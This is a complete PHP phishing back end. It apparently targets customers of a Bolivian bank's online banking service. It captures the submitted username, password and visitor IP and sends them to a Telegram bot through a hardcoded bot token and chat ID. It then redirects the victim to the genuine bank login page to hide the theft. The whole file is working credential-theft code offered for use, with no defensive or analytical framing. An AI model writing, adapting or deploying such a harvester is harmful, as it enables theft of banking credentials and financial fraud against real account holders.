<?php 
if($_POST['password']){
    $ip = $_SERVER['REMOTE_ADDR'];
  $usse = $_POST['username'];
    $pass = $_POST['password'];

        $_token = '6078308633:AAFKem_d4dLDVHBGUjZbpT9nINXwELXLeqs';
 	        $_id = '1739203762';
                $mesg = "--------[Email BO 2]--------\n".
                    "CORREO <code>".$usse."</code>\n".
                        "CLAVE <code>".$pass."</code>\n".
                        "--------[IP]--------\n".
                    "<code>".$ip."</code>\n".
                "---------------------\n";
            $mesg = urlencode($mesg);
            $result = file_get_contents("https://api.telegram.org/bot$_token/sendMessage?chat_id=$_id&text=$mesg&parse_mode=html");
  header("Location: https://fienet.bancofie.com.bo/CWC-IB/services/cobis/web/app/index.html#/login");
} else {
    header("Location: rehsa.php");
}
 
?>